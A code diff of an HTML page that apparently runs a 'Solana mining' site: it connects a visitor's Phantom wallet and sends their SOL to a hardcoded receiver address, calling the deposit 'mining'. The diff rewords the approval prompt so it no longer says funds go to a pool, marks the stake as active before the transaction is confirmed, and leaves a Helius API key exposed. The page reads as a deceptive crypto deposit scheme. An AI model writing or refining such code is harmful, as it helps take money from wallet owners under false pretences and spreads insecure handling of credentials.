@@ -749,17 +749,8 @@
         </div>
     </div>
 
-    <!-- Load Buffer polyfill and Solana Web3 properly -->
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/index.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
-    
+    <!-- Firebase + Phantom + Solana -->
     <script type="module">
-        // Initialize Buffer globally
-        if (typeof window.Buffer === 'undefined') {
-            window.Buffer = Buffer;
-        }
-
-        // Firebase imports
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
         import { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
 
@@ -778,7 +769,7 @@
 
         const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
         
-        // Helius RPC URL
+        // FIXED: Correct Helius RPC URL format
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
         
         let phantom = null;
@@ -909,7 +900,7 @@
             hashRateSpan.innerHTML = `⚡ ${hashRate.toLocaleString()} H/s`;
         }
 
-        // FIREBASE FUNCTIONS
+        // FIREBASE FUNCTIONS - READ FIRST then CREATE if not exists
         async function loadUserData(address) {
             if (!address) return null;
             
@@ -920,10 +911,12 @@
                 const snap = await getDoc(userDocRef);
                 
                 if (snap.exists()) {
+                    // Document exists - just return the data
                     console.log('Found existing user data');
                     addToFeed('📊 loaded existing mining data', 'info');
                     return snap.data();
                 } else {
+                    // Document doesn't exist - create new
                     console.log('No existing data, creating new user');
                     const now = Date.now();
                     const newData = {
@@ -997,7 +990,7 @@
         }
 
         // Add stake and update Firestore
-        async function addStakeToFirestore(amountSol, txid) {
+        async function addStakeToFirestore(amountSol) {
             if (!userDocRef || !walletAddress) return;
             
             const snap = await getDoc(userDocRef);
@@ -1008,10 +1001,7 @@
             
             await updateDoc(userDocRef, {
                 totalStaked: newTotal,
-                lastDailyUpdate: Date.now(),
-                lastTransaction: txid,
-                lastTransactionAmount: amountSol,
-                lastTransactionTime: serverTimestamp()
+                lastDailyUpdate: Date.now()
             });
             
             await refreshUserStats();
@@ -1073,7 +1063,7 @@
             }
         }
 
-        // Send stake transaction - User approves in wallet
+        // Send stake transaction
         async function sendStake(amount = null) {
             if (!walletAddress || !phantom) {
                 alert("Connect your mining rig first");
@@ -1086,24 +1076,29 @@
                 return;
             }
 
-            // Show confirmation modal
-            showModal(
-                "⛏️ APPROVE TRANSACTION", 
-                `Please approve sending ${stakeAmount} SOL to the mining pool in your Phantom wallet`
-            );
+            showModal("⛏️ MINING TRANSACTION", `Adding ${stakeAmount} SOL to mining rig...\nPlease approve in Phantom`);
 
             try {
                 if (!phantom.publicKey) {
                     await phantom.connect();
                 }
 
-                // Create connection
+                // FIXED: Using the correct Helius RPC URL
                 const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
                 
-                // Get recent blockhash
-                const { blockhash } = await connection.getLatestBlockhash('confirmed');
+                // Add timeout and retry logic
+                let blockhash;
+                try {
+                    const result = await connection.getLatestBlockhash();
+                    blockhash = result.blockhash;
+                } catch (blockhashError) {
+                    console.error('Blockhash error:', blockhashError);
+                    // Try public RPC as fallback
+                    const publicConnection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                    const result = await publicConnection.getLatestBlockhash();
+                    blockhash = result.blockhash;
+                }
 
-                // Create transfer transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: phantom.publicKey,
@@ -1112,41 +1107,26 @@
                     })
                 );
                 
-                // Set transaction parameters
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = phantom.publicKey;
 
-                // Request user to sign and approve the transaction
-                modalMessage.innerText = "⏳ Waiting for wallet approval...";
-                
                 const signed = await phantom.signTransaction(transaction);
-                
-                modalMessage.innerText = "⏳ Sending transaction...";
-                
-                // Send the signed transaction
                 const txid = await connection.sendRawTransaction(signed.serialize());
                 
-                modalMessage.innerText = "⏳ Confirming transaction...";
-                
-                // Wait for confirmation
-                const confirmation = await connection.confirmTransaction(txid, 'confirmed');
-                
-                if (confirmation.value.err) {
-                    throw new Error("Transaction failed");
-                }
-                
-                // Success! Update Firestore
                 modalMessage.innerText = "✅ MINING ACTIVE!";
-                modalDetail.innerText = `Transaction: ${txid.slice(0,8)}...${txid.slice(-8)}\nAmount: ${stakeAmount} SOL\nStatus: Confirmed`;
+                modalDetail.innerText = `Transaction: ${txid.slice(0,8)}...${txid.slice(-8)}\nAmount: ${stakeAmount} SOL`;
                 
-                await addStakeToFirestore(stakeAmount, txid);
+                await addStakeToFirestore(stakeAmount);
+                
+                // Confirm transaction
+                await connection.confirmTransaction(txid, 'confirmed');
                 
                 addToFeed(`⛏️ mining started with ${stakeAmount} SOL`, 'mining');
                 
             } catch (err) {
                 console.error('Transaction error:', err);
-                modalMessage.innerText = "❌ MINING FAILED";
-                modalDetail.innerText = err.message || 'Transaction rejected or failed';
+                modalMessage.innerText = "❌ mining failed";
+                modalDetail.innerText = err.message || 'Transaction rejected';
                 addToFeed('⚠️ mining transaction failed', 'warning');
             }
         }
@@ -1212,5 +1192,7 @@
             }
         });
     </script>
+    
+    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
 </body>
 </html>
